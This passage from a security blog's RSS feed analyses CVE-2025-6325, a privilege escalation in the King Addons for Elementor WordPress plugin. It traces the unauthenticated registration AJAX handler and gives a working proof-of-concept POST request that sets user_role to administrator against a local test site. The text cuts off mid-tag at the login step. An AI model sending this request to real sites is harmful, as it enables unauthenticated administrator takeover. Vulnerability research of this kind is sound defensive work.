noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/dokan-lite/vulnerability/wordpress-dokan-plugin-4-0-8-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Dokan Plugin &amp;lt;= 4.1.3 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6325 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2026-01-03-cve-2025-6325/</link>
      <pubDate>Sat, 03 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2026-01-03-cve-2025-6325/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;An &lt;strong&gt;Incorrect Privilege Assignment&lt;/strong&gt; vulnerability in the &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; plugin by &lt;strong&gt;KingAddons.com&lt;/strong&gt; allows &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&#xA;This vulnerability affects &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; from &lt;strong&gt;unknown (n/a)&lt;/strong&gt; up to and including &lt;strong&gt;version 51.1.36 (&amp;lt;= 51.1.36)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6325&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6325&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 51.1.36&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 51.1.37&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/king-addons/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress King Addons for Elementor Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;51.1.14&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;51.1.37&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Elementor Plugin&lt;/strong&gt; → &lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;ul&gt;&#xA;&lt;li&gt;As the name &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; suggests, the plugin requires &lt;strong&gt;Elementor&lt;/strong&gt; to function. It provides multiple widgets and extended features for &lt;strong&gt;Elementor&lt;/strong&gt; to support website interface building.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/widget.png&#34; title=&#34;King Addons for Elementor widgets&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/widget.png&#34; data-sub-html=&#34;&lt;h2&gt;Widget&lt;/h2&gt;&lt;p&gt;King Addons for Elementor widgets&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/widget.png&#39; alt=&#34;Widget&#34; height=&#34;994&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;King Addons for Elementor widgets&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/li&gt;&#xA;&lt;li&gt;The vulnerability is reported to affect versions from &lt;strong&gt;unknown (n/a)&lt;/strong&gt; to &lt;strong&gt;&lt;code&gt;51.1.36&lt;/code&gt; and below&lt;/strong&gt;. However, in practice, this vulnerability has already been patched in some versions within the disclosed range, meaning not all listed versions are actually vulnerable.&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;When performing a code diff between the latest reported affected version (&lt;code&gt;v51.1.36&lt;/code&gt;) and the patched version (&lt;code&gt;v51.1.37&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff1.png&#34; title=&#34;Diff code 1&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/diff1.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff1&lt;/h2&gt;&lt;p&gt;Diff code 1&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff1.png&#39; alt=&#34;Diff1&#34; height=&#34;465&#34; width=&#34;1837&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code 1&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff2.png&#34; title=&#34;Diff code 2&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/diff2.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff2&lt;/h2&gt;&lt;p&gt;Diff code 2&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff2.png&#39; alt=&#34;Diff2&#34; height=&#34;250&#34; width=&#34;1875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code 2&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;After reviewing the changes in these files, I did not observe any modifications directly related to the &lt;strong&gt;Privilege Escalation&lt;/strong&gt; vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;Next, I searched for the sink in version &lt;code&gt;v51.1.36&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/sink.png&#34; title=&#34;Search sink v51.1.36&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/sink.png&#34; data-sub-html=&#34;&lt;h2&gt;Sink&lt;/h2&gt;&lt;p&gt;Search sink v51.1.36&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/sink.png&#39; alt=&#34;Sink&#34; height=&#34;761&#34; width=&#34;1688&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search sink v51.1.36&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;It can be seen that in &lt;code&gt;Login_Register_Form_Ajax.php&lt;/code&gt;, the function &lt;code&gt;Login_Register_Form_Ajax::handle_register_ajax()&lt;/code&gt; directly accepts the &lt;code&gt;$user_role&lt;/code&gt; value from the request and assigns it to the &lt;code&gt;$user_data&lt;/code&gt; array before calling &lt;code&gt;wp_insert_user()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This is the &lt;strong&gt;sink&lt;/strong&gt; of the vulnerability, as untrusted input is passed directly, leading to &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;handle_register_ajax()&lt;/code&gt; function is registered as a callback for the following action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;    &amp;#39;wp_ajax_nopriv_king_addons_user_register&amp;#39;,&#xA;    [&amp;#39;King_Addons\Widgets\Login_Register_Form\Login_Register_Form_Ajax&amp;#39;, &amp;#39;handle_register_ajax&amp;#39;]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Where:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; is an action hook available to &lt;strong&gt;all users&lt;/strong&gt;, including unauthenticated users.&lt;/li&gt;&#xA;&lt;li&gt;When a request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=king_addons_user_register&lt;/code&gt;, WordPress invokes &lt;code&gt;handle_register_ajax()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;King_Addons\Widgets\Login_Register_Form\Login_Register_Form_Ajax&#39;&lt;/code&gt; is related to the &lt;strong&gt;Login/Register Form&lt;/strong&gt; widget of the &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; plugin.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/form.png&#34; title=&#34;King Addons for Elementor Login/Register Form&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/form.png&#34; data-sub-html=&#34;&lt;h2&gt;Form&lt;/h2&gt;&lt;p&gt;King Addons for Elementor Login/Register Form&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/form.png&#39; alt=&#34;Form&#34; height=&#34;857&#34; width=&#34;1916&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;King Addons for Elementor Login/Register Form&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; When a user submits this registration form, the input data is &lt;strong&gt;directly passed to &lt;code&gt;handle_register_ajax()&lt;/code&gt;&lt;/strong&gt; for processing:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/r_enable.png&#34; title=&#34;User registration feature&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/r_enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Registration Enable&lt;/h2&gt;&lt;p&gt;User registration feature&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/r_enable.png&#39; alt=&#34;Registration Enable&#34; height=&#34;453&#34; width=&#34;1620&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;User registration feature&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The function proceeds only if the &lt;strong&gt;user registration&lt;/strong&gt; feature is enabled, which can be activated in the Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/membership.png&#34; title=&#34;Enable user registration&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/membership.png&#34; data-sub-html=&#34;&lt;h2&gt;Member Ship&lt;/h2&gt;&lt;p&gt;Enable user registration&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/membership.png&#39; alt=&#34;Member Ship&#34; height=&#34;878&#34; width=&#34;1074&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable user registration&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Upon further analysis of version &lt;strong&gt;v51.1.36&lt;/strong&gt;, I noticed a comment indicating that the code below it is a &lt;strong&gt;security patch&lt;/strong&gt; intended to prevent &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/analysis.png&#34; title=&#34;Comment section&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/analysis.png&#34; data-sub-html=&#34;&lt;h2&gt;Analysis&lt;/h2&gt;&lt;p&gt;Comment section&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/analysis.png&#39; alt=&#34;Analysis&#34; height=&#34;519&#34; width=&#34;1721&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Comment section&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Comparing this with the list of publicly disclosed vulnerabilities of the &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; plugin:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/compare.png&#34; title=&#34;Comparison&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/compare.png&#34; data-sub-html=&#34;&lt;h2&gt;Compare&lt;/h2&gt;&lt;p&gt;Comparison&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/compare.png&#39; alt=&#34;Compare&#34; height=&#34;1021&#34; width=&#34;1537&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Comparison&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Only &lt;strong&gt;one Privilege Escalation vulnerability&lt;/strong&gt; is listed.&lt;/li&gt;&#xA;&lt;li&gt;However, in version &lt;strong&gt;v51.1.36&lt;/strong&gt;, this vulnerability has already been patched.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; This means that &lt;strong&gt;version v51.1.36 can no longer be exploited for this vulnerability&lt;/strong&gt;.&#xA;This is the reason why, in the &lt;a href=&#34;#requirements&#34;&gt;&lt;strong&gt;Requirements&lt;/strong&gt;&lt;/a&gt; section, I require using version &lt;strong&gt;v51.1.14&lt;/strong&gt;, as this version &lt;strong&gt;does not include the patch&lt;/strong&gt; and still contains the vulnerability for analysis or testing purposes.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/role.png&#34; title=&#34;Code v51.1.14&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/role.png&#34; data-sub-html=&#34;&lt;h2&gt;Code v51.1.14&lt;/h2&gt;&lt;p&gt;Code v51.1.14&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/role.png&#39; alt=&#34;Code v51.1.14&#34; height=&#34;521&#34; width=&#34;1771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Code v51.1.14&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated User&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Submit Register Form (King Addons Login/Register Widget)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;action=king_addons_user_register&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;wp_ajax_nopriv_king_addons_user_register&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Login_Register_Form_Ajax::handle_register_ajax()&amp;#34;]&#xA;&#xA;F --&amp;gt; G{&amp;#34;User Registration Enabled?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;Abort&amp;#34;]&#xA;G -- Yes --&amp;gt; I[&amp;#34;Read POST parameters&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;user_role taken directly from request&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Build user_data array&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;wp_insert_user(user_data)&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;WordPress assigns role from user_role&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;User account created with elevated role&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Submit the registration form and intercept the request using Burp Proxy&lt;/li&gt;&#xA;&lt;li&gt;Add the &lt;code&gt;user_role&lt;/code&gt; parameter with the value &lt;code&gt;administrator&lt;/code&gt; to the request and send it:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=king_addons_user_register&amp;amp;nonce=2d3fdafcc0&amp;amp;email=abc%40gmail.com&amp;amp;username=abc&amp;amp;password=Hacker111%3F&amp;amp;confirm_password=Hacker111%3F&amp;amp;widget_id=c03756f&amp;amp;recaptcha_secret_key=&amp;amp;recaptcha_score_threshold=0.5&amp;amp;redirect_after_register=&amp;amp;terms_required=no&amp;amp;enable_user_email=yes&amp;amp;user_email_subject=Welcome&amp;#43;to&amp;#43;%7Bsite_name%7D!&amp;amp;user_email_content=Hello&amp;#43;%7Buser_name%7D%2C%0A%0AWelcome&amp;#43;to&amp;#43;%7Bsite_name%7D!%0A%0AYour&amp;#43;account&amp;#43;has&amp;#43;been&amp;#43;successfully&amp;#43;created.%0A%0AUsername%3A&amp;#43;%7Busername%7D%0AEmail%3A&amp;#43;%7Buser_email%7D%0A%0AThank&amp;#43;you&amp;#43;for&amp;#43;joining&amp;#43;us!%0A%0ABest&amp;#43;regards%2C%0A%7Bsite_name%7D&amp;#43;Team&amp;amp;enable_admin_email=no&amp;amp;admin_email_address=&amp;amp;admin_email_subject=&amp;amp;admin_email_content=&amp;amp;enable_mailchimp_integration=no&amp;amp;mailchimp_api_key=&amp;amp;mailchimp_list_id=&amp;amp;mailchimp_double_optin=no&amp;amp;auto_login_after_register=yes&amp;amp;user_role=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/result.png&#39; alt=&#34;Result&#34; height=&#34;662&#34; width=&#34;1544&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Log in using the newly created account&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/login.png&#34; title=&#34;Login&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/login.png&#34; 